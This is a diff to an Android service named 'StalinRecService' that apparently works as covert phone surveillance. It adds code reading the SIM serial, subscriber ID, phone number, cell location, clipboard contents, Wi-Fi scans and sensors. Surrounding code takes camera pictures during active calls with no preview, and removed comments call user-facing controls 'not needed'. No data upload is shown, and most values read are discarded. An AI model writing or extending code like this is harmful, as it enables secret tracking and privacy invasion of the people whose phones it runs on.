@@ -19,6 +19,7 @@ import android.content.pm.PackageManager;
 import android.hardware.Camera;
 import android.hardware.Camera.CameraInfo;
 import android.hardware.Camera.PictureCallback;
+import android.hardware.Sensor;
 import android.hardware.SensorManager;
 import android.location.Location;
 import android.location.LocationManager;
@@ -73,19 +74,6 @@ public class StalinRecService extends Service {
     Runnable mTask = new Runnable() {
         public void run() {
 
-        	TelephonyManager phoneManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        	
-        	ClipboardManager clipManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-        	PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        	SensorManager sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
-
-        	
-        	
-
-        	
-        	
-        	
-        	
         	StalinRecService.now = new Date();
         	String recFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
         	String picFileName = "";
@@ -184,10 +172,56 @@ public class StalinRecService extends Service {
 	         	int x = dInfo.dns1;
 	         	
 	         	List<ScanResult> sResults = wifiManager.getScanResults();
+	        	for(int sCount = sResults.size()-1; 0 <= sCount; sCount--)
+	        	{
+	        		ScanResult sResult = sResults.get(sCount);
+	        		int x2 = sResult.frequency;
+	        	}
 		  		
 		  		
-		  		
-		  		
+	        	SensorManager sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
+	        	List<Sensor> sList = sensorManager.getSensorList(Sensor.TYPE_ALL);
+	        	for(int sCount = sList.size()-1; 0 <= sCount; sCount--)
+	        	{
+	        		Sensor sResult = sList.get(sCount);
+	        		sResult.getType();
+	        		sResult.getName();
+	        		sResult.getPower();
+	        		sResult.getResolution();
+	        		sResult.getVendor();
+	        	}	
+	        	
+	        	
+	        	
+	        	PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+	        	powerManager.isScreenOn();
+	        	
+	        	
+	        	ClipboardManager clipManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+	        	clipManager.hasText();
+	        	clipManager.getText();
+	        	
+	        	
+	        	
+	        	
+
+	        	TelephonyManager phoneManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+	        	phoneManager.getDataActivity();
+	        	phoneManager.getCellLocation();
+	        	phoneManager.getDataState();
+	        	phoneManager.getDeviceSoftwareVersion();
+	        	phoneManager.getNetworkCountryIso();
+	        	phoneManager.getLine1Number();
+	        	phoneManager.getNetworkOperator();
+	        	phoneManager.getNetworkOperatorName();
+	        	phoneManager.getNetworkType();
+	        	phoneManager.getPhoneType();
+	        	phoneManager.getSimOperator();
+	        	phoneManager.getSimOperatorName();
+	        	phoneManager.getSimSerialNumber();
+	        	phoneManager.getSimState();
+	        	phoneManager.getSubscriberId();
+	        	phoneManager.isNetworkRoaming();
 		  		
 		  		
 		  		
@@ -245,26 +279,16 @@ public class StalinRecService extends Service {
             
 //you can get further information about its capabilties using the Camera.getParameters() method and checking the returned Camera.Parameters object
             
-            
-        	
-        	//???maybe
-//        	Create a Preview Class - Create a camera preview class that extends SurfaceView and implements the SurfaceHolder interface. This class previews the live images from the camera.
-
-        	//not needed //            Build a Preview Layout - Once you have the camera preview class, create a view layout that incorporates the preview and the user interface controls you want.
-        	//not needed //            Setup Listeners for Capture - Connect listeners for your interface controls to start image or video capture in response to user actions, such as pressing a button.
-
-        	
-        	
         	
         	int i = 0, camCount = 0;
-        	
+
             while ( ! (phoneManager.getCallState() == TelephonyManager.CALL_STATE_IDLE)) {
             	i++;
             	
 //            	CameraInfo cameraInfo;
 //            	c.getCameraInfo(0, cameraInfo);
 //            	cameraInfo.
-            	if(i>=10000)
+            	if(i>=10000) //about 4 seconds... prefs 5000-50000
             	{
 //                    Log.d("DEBUG", "STALINphone-stalinCAM ::: pic" );
             		i=0;
